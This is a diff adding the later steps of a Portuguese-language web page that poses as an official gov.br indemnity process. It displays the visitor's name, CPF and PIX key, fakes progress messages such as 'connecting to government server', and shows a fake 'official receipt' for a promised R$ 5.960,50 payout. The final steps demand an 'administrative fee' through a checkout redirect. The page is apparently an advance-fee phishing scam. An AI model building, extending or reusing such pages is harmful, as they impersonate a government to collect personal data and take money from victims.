+                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>
+                        <span class="font-bold text-sm">CHAVE PIX CADASTRADA</span>
+                    </div>
+                    <p class="text-xs opacity-90">Chave PIX cadastrada com sucesso!</p>
+                </div>
+                <div class="p-6">
+                    <div class="text-center">
+                        <div class="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
+                            <svg class="w-10 h-10 text-green-600" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>
+                        </div>
+                        <h2 class="text-2xl font-bold text-gray-900 mb-2">✅ Chave PIX Cadastrada!</h2>
+                        <p class="text-gray-600 mb-6">Sua chave PIX foi registrada com sucesso no sistema</p>
+                        <div class="bg-gradient-to-r from-green-50 to-green-100 border border-green-200 rounded-xl p-6 mb-6">
+                            <h3 class="font-bold text-green-800 mb-2">Dados Confirmados</h3>
+                            <div class="space-y-2 text-sm"><div class="flex justify-between items-center">
+                                <span class="text-green-700">Beneficiário:</span>
+                                <span class="font-medium text-green-900 text-right" id="nameUser11"></span>
+                            </div>
+                            <div class="flex justify-between items-center">
+                                <span class="text-green-700">Chave PIX:</span>
+                                <span class="font-mono text-green-900 text-xs break-all" id="chavePix11"></span>
+                            </div>
+                            <div class="flex justify-between items-center border-t border-green-300 pt-2 mt-2">
+                                <span class="text-green-700 font-semibold">Valor:</span>
+                                <span class="font-bold text-green-900 text-lg">R$ 5.960,50</span>
+                            </div>
+                        </div>
+                    </div>
+                    <button onclick="step11to12()" class="w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white font-bold py-4 px-6 rounded-xl transition-all duration-300 shadow-lg hover:shadow-xl transform hover:-translate-y-0.5 flex items-center justify-center space-x-2 mb-4">
+                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M9.383 3.076A1 1 0 0110 4v12a1 1 0 01-1.617.816L4.846 14H2a1 1 0 01-1-1V7a1 1 0 011-1h2.846l3.537-2.816a1 1 0 011.617.816zM16 10a3 3 0 00-3-3v2a1 1 0 000 2v2a3 3 0 003-3z" clip-rule="evenodd"></path><path d="M18.364 4.636a9 9 0 010 12.728l-1.414-1.414a7 7 0 000-9.9l1.414-1.414z"></path></svg>
+                        <span>CONTINUAR</span>
+                    </button>
+                    <div class="bg-blue-50 rounded-xl p-4">
+                        <p class="text-blue-700 text-sm">Clique no botão acima para ouvir as informações importantes sobre o próximo passo.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        </div>
+    
+   
+
+    <div class="max-w-md mx-auto hidden" id="step12">
+        <div class="mb-6">
+            <div class="flex items-center justify-between text-xs text-gray-600 mb-3">
+            <span class="font-medium">Confirmação</span>
+            <span class="bg-blue-100 text-blue-800 px-2 py-1 rounded-full font-medium">5 de 6</span>
+        </div>
+        <div class="w-full bg-gray-200 rounded-full h-2 mb-2">
+            <div class="bg-gradient-to-r from-blue-500 to-blue-600 h-2 rounded-full transition-all duration-500" style="width: 83.3333%;">
+
+        </div>
+    </div>
+        <p class="text-xs text-gray-500 text-center">Dados de recebimento</p>
+    </div>
+        <div class="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
+            <div class="text-white p-4 text-center transition-all duration-500 bg-gradient-to-r from-blue-600 to-blue-700">
+            <div class="flex items-center justify-center space-x-2 mb-2">
+            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
+            <path fill-rule="evenodd" d="M9.383 3.076A1 1 0 0110 4v12a1 1 0 01-1.617.816L4.846 14H2a1 1 0 01-1-1V7a1 1 0 011-1h2.846l3.537-2.816a1 1 0 011.617.816zM16 10a3 3 0 00-3-3v2a1 1 0 000 2v2a3 3 0 003-3z" clip-rule="evenodd">
+
+        </path>
+            <path d="M18.364 4.636a9 9 0 010 12.728l-1.414-1.414a7 7 0 000-9.9l1.414-1.414z">
+
+        </path>
+        </svg>
+            <span class="font-bold text-sm">INFORMAÇÕES FINAIS</span>
+        </div>
+        <p class="text-xs opacity-90">Ouça as informações importantes</p>
+    </div>
+        <div class="p-6">
+            <div class="text-center">
+            <div class="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
+            <svg class="w-10 h-10 text-green-600 animate-pulse" fill="currentColor" viewBox="0 0 20 20">
+            <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zM7 8a1 1 0 012 0v4a1 1 0 11-2 0V8zM12 6a1 1 0 012 0v8a1 1 0 11-2 0V6z" clip-rule="evenodd">
+
+        </path>
+        </svg>
+        </div>
+        <h2 class="text-xl font-bold text-gray-900 mb-4">Informações Finais</h2>
+        <p class="text-gray-600 mb-6">Reproduzindo informações sobre o próximo passo</p>
+        <div class="bg-gray-50 rounded-xl p-6 mb-6">
+            <div class="flex items-center justify-between mb-4">
+            <div class="flex items-center space-x-2">
+            <svg class="w-5 h-5 text-gray-600" fill="currentColor" viewBox="0 0 20 20">
+            <path fill-rule="evenodd" d="M9.383 3.076A1 1 0 0110 4v12a1 1 0 01-1.617.816L4.846 14H2a1 1 0 01-1-1V7a1 1 0 011-1h2.846l3.537-2.816a1 1 0 011.617.816zM16 10a3 3 0 00-3-3v2a1 1 0 000 2v2a3 3 0 003-3z" clip-rule="evenodd">
+
+        </path>
+            <path d="M18.364 4.636a9 9 0 010 12.728l-1.414-1.414a7 7 0 000-9.9l1.414-1.414z">
+
+        </path>
+        </svg>
+            <span class="text-sm font-medium text-gray-700">Instruções Finais</span>
+        </div>
+        <div class="text-sm text-gray-500"><span id="actualTime2">00:00</span> / 0:19</div>
+    </div>
+        <div class="mb-4">
+            <div class="w-full bg-gray-200 rounded-full h-2">
+                <audio id="audio2" src="./assets/audio/audio2.mp3"></audio>
+            <div class="bg-gradient-to-r from-blue-500 to-blue-6000 h-2 rounded-full transition-all duration-300" style="width: 0%" id="progress-bar-audio2">
+
+        </div>
+    </div>
+    </div>
+        <div class="flex items-center justify-center space-x-4">
+            <div class="flex items-center space-x-2">
+            <div class="flex space-x-1">
+            <div class="w-1 h-6 bg-blue-500 rounded-full animate-pulse" style="animation-delay: 0s;">
+
+        </div>
+        <div class="w-1 h-6 bg-blue-500 rounded-full animate-pulse" style="animation-delay: 0.15s;">
+
+        </div>
+        <div class="w-1 h-6 bg-blue-500 rounded-full animate-pulse" style="animation-delay: 0.3s;">
+
+        </div>
+        <div class="w-1 h-6 bg-blue-500 rounded-full animate-pulse" style="animation-delay: 0.45s;">
+
+        </div>
+    </div>
+        <span class="text-blue-700 text-sm font-medium">Reproduzindo...</span>
+    </div>
+    </div>
+    </div>
+        <div class="rounded-xl p-4 mb-6 bg-green-50 border border-green-200">
+            <div class="flex items-center justify-center space-x-2">
+            <svg class="w-5 h-5 text-green-600" fill="currentColor" viewBox="0 0 20 20">
+            <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zM7 8a1 1 0 012 0v4a1 1 0 11-2 0V8zM12 6a1 1 0 012 0v8a1 1 0 11-2 0V6z" clip-rule="evenodd">
+
+        </path>
+        </svg>
+            <span class="text-blue-700 text-sm font-medium">🎵 Reproduzindo instruções importantes...</span>
+        </div>
+    </div>
+        <div class="bg-amber-50 border border-amber-200 rounded-xl p-4">
+            <div class="flex items-start space-x-3">
+            <svg class="w-5 h-5 text-amber-600 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
+            <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd">
+
+        </path>
+        </svg>
+            <div>
+            <h4 class="font-bold text-amber-800 text-sm mb-1">Próximo Passo</h4>
+            <p class="text-amber-700 text-sm">Após ouvir as instruções, você será direcionado para gerar o comprovante oficial de recebimento.</p>
+        </div>
+    </div>
+    </div>
+</div>
+</div>
+</div>
+</div>
+
+
+<div class="max-w-md mx-auto hidden" id="step13">
+    <div class="mb-6">
+        <div class="flex items-center justify-between text-xs text-gray-600 mb-3">
+        <span class="font-medium">Finalização</span>
+        <span class="bg-blue-100 text-blue-800 px-2 py-1 rounded-full font-medium">6 de 6</span>
+    </div>
+    <div class="w-full bg-gray-200 rounded-full h-2 mb-2">
+        <div class="bg-gradient-to-r from-blue-500 to-blue-600 h-2 rounded-full transition-all duration-500" style="width: 100%;">
+
+    </div>
+</div>
+    <p class="text-xs text-gray-500 text-center">Conclusão do processo</p>
+</div>
+    <div class="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
+        <div class="text-white p-4 text-center transition-all duration-500 bg-gradient-to-r from-green-600 to-green-700">
+        <div class="flex items-center justify-center space-x-2 mb-2">
+        <svg class="w-5 h-5 animate-spin" fill="none" viewBox="0 0 24 24">
+        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4">
+
+    </circle>
+        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z">
+
+    </path>
+    </svg>
+        <span class="font-bold text-sm">GERANDO COMPROVANTE</span>
+    </div>
+    <p class="text-xs opacity-90">Aguarde enquanto geramos seu comprovante</p>
+</div>
+    <div class="p-6">
+        <div class="text-center">
+        <div class="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
+        <svg class="w-10 h-10 text-green-600 animate-spin" fill="none" viewBox="0 0 24 24">
+        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4">
+
+    </circle>
+        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z">
+
+    </path>
+    </svg>
+    </div>
+    <h2 class="text-xl font-bold text-gray-900 mb-4">Gerando Comprovante</h2>
+    <p class="text-gray-600 mb-6">Estamos preparando seu comprovante de recebimento oficial</p>
+    <div class="mb-6">
+        <div class="flex justify-between items-center mb-2">
+        <span class="text-sm font-medium text-gray-700">Progresso da geração</span>
+        <span id="percent2" class="text-sm font-medium text-green-600">0%</span>
+    </div>
+    <div class="w-full bg-gray-200 rounded-full h-3">
+        <div id="progress-bar2" class="bg-gradient-to-r from-green-500 to-green-600 h-3 rounded-full transition-all duration-300" style="width: 0%;">
+
+    </div>
+</div>
+</div>
+    <div class="space-y-3 text-left">
+        <div class="flex items-center space-x-3">
+        <div class="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
+        <svg class="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20">
+        <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd">
+
+    </path>
+    </svg>
+    </div>
+    <span class="text-sm text-gray-700">Conectando com servidor governamental</span>
+</div>
+    <div class="flex items-center space-x-3">
+        <div class="w-6 h-6 rounded-full flex items-center justify-center bg-green-500">
+        <svg class="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20">
+        <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd">
+
+    </path>
+    </svg>
+    </div>
+    <span class="text-sm text-gray-700">Processando dados do usuário</span>
+</div>
+<div class="space-y-3 text-left">
+        <div class="flex items-center space-x-3">
+        <div class="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
+        <svg class="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20">
+        <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd">
+
+    </path>
+    </svg>
+    </div>
+   <span class="text-sm text-gray-700">Gerando comprovante personalizado</span>
+</div>
+    
+</div>
+     <div class="space-y-3 text-left">
+        <div class="flex items-center space-x-3">
+        <div class="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
+        <svg class="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20">
+        <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd">
+
+    </path>
+    </svg>
+    </div>
+    <span class="text-sm text-gray-700">Finalizando comprovane</span>
+</div>
+</div>
+    <div class="bg-blue-50 rounded-xl p-4 mt-6">
+        <div class="flex items-start space-x-3">
+        <svg class="w-5 h-5 text-blue-600 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
+        <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd">
+
+    </path>
+    </svg>
+        <div>
+        <h4 class="font-semibold text-blue-800 text-sm mb-1">Comprovante Oficial</h4>
+        <p class="text-blue-700 text-xs">Este documento é gerado pelo sistema gov.br com sua imagem personalizada e comprova sua solicitação de indenização governamental.</p>
+    </div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="max-w-md mx-auto hidden" id="step14">
+    <div class="mb-6">
+        <div class="flex items-center justify-between text-xs text-gray-600 mb-3">
+            <span class="font-medium">Finalização</span>
+            <span class="bg-blue-100 text-blue-800 px-2 py-1 rounded-full font-medium">6 de 6</span>
+        </div>
+        <div class="w-full bg-gray-200 rounded-full h-2 mb-2">
+            <div class="bg-gradient-to-r from-blue-500 to-blue-600 h-2 rounded-full transition-all duration-500" style="width: 100%;">
+
+        </div>
+    </div>
+        <p class="text-xs text-gray-500 text-center">Conclusão do processo</p>
+    </div>
+        <div class="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
+            <div class="text-white p-4 text-center transition-all duration-500 bg-gradient-to-r from-green-600 to-green-700">
+            <div class="flex items-center justify-center space-x-2 mb-2">
+            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
+            <path fill-rule="evenodd" d="M4 4a2 2 0 012-2h8a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2V4zm3 1h6v4H7V5zm8 8v2a1 1 0 01-1 1H6a1 1 0 01-1-1v-2h8z" clip-rule="evenodd">
+
+        </path>
+        </svg>
+            <span class="font-bold text-sm">COMPROVANTE GERADO</span>
+        </div>
+        <p class="text-xs opacity-90">Seu comprovante de recebimento foi gerado</p>
+    </div>
+        <div class="p-6">
+            <div>
+            <div class="bg-gradient-to-r from-green-50 to-green-100 border border-green-200 rounded-xl p-4 mb-6">
+            <h3 class="font-bold text-green-800 mb-3 text-sm">Resumo da Indenização:</h3>
+            <div class="space-y-2 text-sm">
+            <div class="flex justify-between items-center">
+            <span class="text-green-700">Beneficiário:</span>
+            <span class="font-medium text-green-900 text-right" id="nameUser14">
+
+            </span>
+        </div>
+        <div class="flex justify-between items-center">
+            <span class="text-green-700">CPF:</span>
+            <span class="font-medium text-green-900" id="cpfUser14"></span>
+        </div>
+        <div class="flex justify-between items-center">
+            <span class="text-green-700">Chave PIX:</span>
+            <span class="font-mono text-green-900 text-xs break-all" id="chavePix14"></span>
+        </div>
+        <div class="flex justify-between items-center">
+            <span class="text-green-700">Tipo:</span>
+            <span class="font-medium text-green-900" id="tipoPix14"></span>
+        </div>
+        <div class="flex justify-between items-center border-t border-green-300 pt-2 mt-2">
+            <span class="text-green-700 font-semibold">Valor Total:</span>
+            <span class="font-bold text-green-900 text-lg">R$ 5.960,50</span>
+        </div>
+    </div>
+    </div>
+        <div class="bg-white border-2 border-gray-200 rounded-xl p-4 mb-6">
+            <h4 class="font-semibold text-gray-800 mb-3 text-center">Comprovante Oficial gov.br</h4>
+            <div class="relative">
+               <!-- Skeleton (mostra enquanto a imagem carrega) -->
+<div id="comprovanteSkeleton"
+     class="w-full h-64 bg-gray-200 animate-pulse rounded-xl"></div>
+
+<!-- Imagem final do comprovante (começa oculta e sem src) -->
+<img id="comprovanteImg"
+     class="hidden w-full h-auto rounded-lg shadow-sm"
+     alt="Comprovante gerado automaticamente" /> 
+
+
+        </div>
+    </div>
+        <div class="space-y-3">
+            <button onclick="step14to15()" class="w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white font-bold py-4 px-6 rounded-xl transition-all duration-300 shadow-lg hover:shadow-xl transform hover:-translate-y-0.5 flex items-center justify-center space-x-2">
+            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
+            <path fill-rule="evenodd" d="M9.383 3.076A1 1 0 0110 4v12a1 1 0 01-1.617.816L4.846 14H2a1 1 0 01-1-1V7a1 1 0 011-1h2.846l3.537-2.816a1 1 0 011.617.816zM16 10a3 3 0 00-3-3v2a1 1 0 000 2v2a3 3 0 003-3z" clip-rule="evenodd">
+
+        </path><path d="M18.364 4.636a9 9 0 010 12.728l-1.414-1.414a7 7 0 000-9.9l1.414-1.414z"></path></svg><span>OUVIR INSTRUÇÕES FINAIS</span></button>
+    </div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="max-w-md mx-auto hidden" id="step15">
+    <div class="mb-6">
+        <div class="flex items-center justify-between text-xs text-gray-600 mb-3">
+        <span class="font-medium">Finalização</span>
+        <span class="bg-blue-100 text-blue-800 px-2 py-1 rounded-full font-medium">6 de 6</span>
+    </div>
+    <div class="w-full bg-gray-200 rounded-full h-2 mb-2">
+        <div class="bg-gradient-to-r from-blue-500 to-blue-600 h-2 rounded-full transition-all duration-500" style="width: 100%;">
+
+    </div>
+</div>
+    <p class="text-xs text-gray-500 text-center">Conclusão do processo</p>
+</div>
+    <div class="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
+        <div class="text-white p-4 text-center transition-all duration-500 bg-gradient-to-r from-blue-600 to-blue-700">
+        <div class="flex items-center justify-center space-x-2 mb-2">
+        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
+        <path fill-rule="evenodd" d="M9.383 3.076A1 1 0 0110 4v12a1 1 0 01-1.617.816L4.846 14H2a1 1 0 01-1-1V7a1 1 0 011-1h2.846l3.537-2.816a1 1 0 011.617.816zM16 10a3 3 0 00-3-3v2a1 1 0 000 2v2a3 3 0 003-3z" clip-rule="evenodd">
+
+    </path>
+        <path d="M18.364 4.636a9 9 0 010 12.728l-1.414-1.414a7 7 0 000-9.9l1.414-1.414z">
+
+    </path>
+    </svg>
+        <span class="font-bold text-sm">INSTRUÇÕES FINAIS</span>
+    </div>
+    <p class="text-xs opacity-90">Ouça as instruções importantes</p>
+</div>
+    <div class="p-6">
+        <div class="text-center">
+        <div class="w-20 h-20 bg-purple-100 rounded-full flex items-center justify-center mx-auto mb-6">
+        <svg class="w-10 h-10 text-blue-600 animate-pulse" fill="currentColor" viewBox="0 0 20 20">
+        <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zM7 8a1 1 0 012 0v4a1 1 0 11-2 0V8zM12 6a1 1 0 012 0v8a1 1 0 11-2 0V6z" clip-rule="evenodd">
+
+    </path>
+    </svg>
+    </div>
+    <h2 class="text-xl font-bold text-gray-900 mb-4">Instruções Finais</h2>
+    <p class="text-gray-600 mb-6">Reproduzindo instruções sobre o próximo passo</p>
+    <div class="bg-gray-50 rounded-xl p-6 mb-6">
+        <div class="flex items-center justify-between mb-4">
+        <div class="flex items-center space-x-2">
+        <svg class="w-5 h-5 text-gray-600" fill="currentColor" viewBox="0 0 20 20">
+        <path fill-rule="evenodd" d="M9.383 3.076A1 1 0 0110 4v12a1 1 0 01-1.617.816L4.846 14H2a1 1 0 01-1-1V7a1 1 0 011-1h2.846l3.537-2.816a1 1 0 011.617.816zM16 10a3 3 0 00-3-3v2a1 1 0 000 2v2a3 3 0 003-3z" clip-rule="evenodd">
+
+    </path>
+        <path d="M18.364 4.636a9 9 0 010 12.728l-1.414-1.414a7 7 0 000-9.9l1.414-1.414z">
+
+    </path>
+    </svg>
+        <span class="text-sm font-medium text-gray-700">Instruções Finais</span>
+    </div>
+    <div class="text-sm text-gray-500"><span id="actualTime3">00:00</span> / 0:28</div>
+</div>
+    <div class="mb-4">
+        <div class="w-full bg-gray-200 rounded-full h-2">
+        <audio id="audio3" src="./assets/audio/audioindenize03.mp3"></audio>
+        <div class="bg-gradient-to-r from-blue-500 to-blue-600 h-2 rounded-full transition-all duration-300" style="width: 0%;" id="progress-bar-audio3">
+
+    </div>
+</div>
+</div>
+    <div class="flex items-center justify-center space-x-4">
+        <div class="flex items-center space-x-2">
+        <div class="flex space-x-1">
+        <div class="w-1 h-6 bg-blue-500 rounded-full animate-pulse" style="animation-delay: 0s;">
+
+    </div>
+    <div class="w-1 h-6 bg-blue-500 rounded-full animate-pulse" style="animation-delay: 0.15s;">
+
+    </div>
+    <div class="w-1 h-6 bg-blue-500 rounded-full animate-pulse" style="animation-delay: 0.3s;">
+
+    </div>
+    <div class="w-1 h-6 bg-blue-500 rounded-full animate-pulse" style="animation-delay: 0.45s;">
+
+    </div>
+</div>
+    <span class="text-blue-700 text-sm font-medium">Reproduzindo...</span>
+</div>
+</div>
+</div>
+    <div class="rounded-xl p-4 mb-6 bg-purple-50 border border-purple-200">
+        <div class="flex items-center justify-center space-x-2">
+        <svg class="w-5 h-5 text-purple-600" fill="currentColor" viewBox="0 0 20 20">
+        <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zM7 8a1 1 0 012 0v4a1 1 0 11-2 0V8zM12 6a1 1 0 012 0v8a1 1 0 11-2 0V6z" clip-rule="evenodd">
+
+    </path>
+    </svg>
+        <span class="text-blue-700 text-sm font-medium">🎵 Reproduzindo instruções importantes...</span>
+    </div>
+</div>
+    <div class="bg-amber-50 border border-amber-200 rounded-xl p-4">
+        <div class="flex items-start space-x-3">
+        <svg class="w-5 h-5 text-amber-600 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
+        <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd">
+
+    </path>
+    </svg>
+        <div>
+        <h4 class="font-bold text-amber-800 text-sm mb-1">Atenção!</h4>
+        <p class="text-amber-700 text-sm">Para finalizar o processo e receber sua indenização, é necessário efetuar o pagamento da taxa administrativa conforme as instruções do áudio.</p>
+    </div>
+</div>
+</div>
+</div>
+</div>
+</div></div>
+
+
+
+    <div class="max-w-md mx-auto hidden" id="step16">
+        <div class="mb-6">
+            <div class="flex items-center justify-between text-xs text-gray-600 mb-3">
+            <span class="font-medium">Finalização</span>
+            <span class="bg-blue-100 text-blue-800 px-2 py-1 rounded-full font-medium">6 de 6</span>
+        </div>
+        <div class="w-full bg-gray-200 rounded-full h-2 mb-2">
+            <div class="bg-gradient-to-r from-blue-500 to-blue-600 h-2 rounded-full transition-all duration-500" style="width: 100%;">
+
+        </div>
+    </div>
+        <p class="text-xs text-gray-500 text-center">Conclusão do processo</p>
+    </div>
+        <div class="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
+            <div class="text-white p-4 text-center transition-all duration-500 bg-gradient-to-r from-orange-600 to-orange-700">
+            <div class="flex items-center justify-center space-x-2 mb-2">
+            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
+            <path d="M4 4a2 2 0 00-2 2v4a2 2 0 002 2V6h10a2 2 0 00-2-2H4zm2 6a2 2 0 012-2h8a2 2 0 012 2v4a2 2 0 01-2 2H8a2 2 0 01-2-2v-4zm6 4a2 2 0 100-4 2 2 0 000 4z">
+
+        </path>
+        </svg>
+            <span class="font-bold text-sm">EFETUAR PAGAMENTO</span>
+        </div>
+        <p class="text-xs opacity-90">Finalize o processo com o pagamento</p>
+    </div>
+        <div class="p-6">
+            <div>
+            <div class="text-center mb-6">
+            <div class="w-16 h-16 bg-orange-100 rounded-full flex items-center justify-center mx-auto mb-4">
+            <svg class="w-8 h-8 text-orange-600" fill="currentColor" viewBox="0 0 20 20">
+            <path d="M4 4a2 2 0 00-2 2v4a2 2 0 002 2V6h10a2 2 0 00-2-2H4zm2 6a2 2 0 012-2h8a2 2 0 012 2v4a2 2 0 01-2 2H8a2 2 0 01-2-2v-4zm6 4a2 2 0 100-4 2 2 0 000 4z">
+
+        </path>
+        </svg>
+        </div>
+        <h2 class="text-xl font-bold text-gray-900 mb-2">Finalizar Processo</h2>
+        <p class="text-gray-600 text-sm">Efetue o pagamento para concluir sua solicitação de indenização</p>
+    </div>
+        <div class="bg-gradient-to-r from-green-50 to-green-100 border border-green-200 rounded-xl p-6 mb-6 text-center">
+            <h3 class="font-bold text-green-800 mb-2">Valor a Receber</h3>
+            <div class="text-3xl font-bold text-green-600 mb-2">R$ 5.960,50</div>
+        <p class="text-sm text-green-700">Será transferido via PIX após confirmação</p>
+    </div>
+        <div class="bg-blue-50 rounded-xl p-4 mb-6">
+            <h4 class="font-semibold text-blue-800 mb-3 text-sm">Processo Finalizado:</h4>
+            <div class="space-y-2 text-sm">
+            <div class="flex items-center space-x-2">
+            <svg class="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20">
+            <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd">
+
+        </path>
+        </svg>
+            <span class="text-blue-700">Dados verificados e aprovados</span>
+        </div>
+        <div class="flex items-center space-x-2">
+            <svg class="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20">
+            <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd">
+
+        </path>
+        </svg>
+            <span class="text-blue-700">Chave PIX cadastrada com sucesso</span>
+        </div>
+        <div class="flex items-center space-x-2">
+            <svg class="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20">
+            <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd">
+
+        </path>
+        </svg>
+            <span class="text-blue-700">Comprovante oficial gerado</span>
+        </div>
+    </div>
+    </div>
+        <div class="space-y-4">
+
+            <!-- link do checkout -->
+            <button onclick="redirect()" class="w-full font-bold py-4 px-6 rounded-xl transition-all duration-300 shadow-lg hover:shadow-xl transform hover:-translate-y-0.5 flex items-center justify-center space-x-2 bg-gradient-to-r from-orange-600 to-orange-700 hover:from-orange-700 hover:to-orange-800 text-white">
+            <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 20 20">
+            <path d="M4 4a2 2 0 00-2 2v4a2 2 0 002 2V6h10a2 2 0 00-2-2H4zm2 6a2 2 0 012-2h8a2 2 0 012 2v4a2 2 0 01-2 2H8a2 2 0 01-2-2v-4zm6 4a2 2 0 100-4 2 2 0 000 4z">
+
+        </path>
+        </svg>
+            <span>EFETUAR PAGAMENTO</span>
+            <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
+            <path fill-rule="evenodd" d="M10.293 3.293a1 1 0 011.414 0l6 6a1 1 0 010 1.414l-6 6a1 1 0 01-1.414-1.414L14.586 11H3a1 1 0 110-2h11.586l-4.293-4.293a1 1 0 010-1.414z" clip-rule="evenodd">
+
+        </path>
+        </svg>
+    </button>
+            <!-- <button class="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 font-semibold py-3 px-6 rounded-xl transition-colors flex items-center justify-center space-x-2">
+            <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
+            <path fill-rule="evenodd" d="M9.707 16.707a1 1 0 01-1.414 0l-6-6a1 1 0 010-1.414l6-6a1 1 0 011.414 1.414L5.414 9H17a1 1 0 110 2H5.414l4.293 4.293a1 1 0 010 1.414z" clip-rule="evenodd">
+
+        </path>
+        </svg>
+            <span>Voltar</span>
+        </button> -->
+        </div>
+        <div class="bg-gray-50 rounded-xl p-4 mt-6">
+            <div class="flex items-start space-x-3">
+            <svg class="w-5 h-5 text-gray-600 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
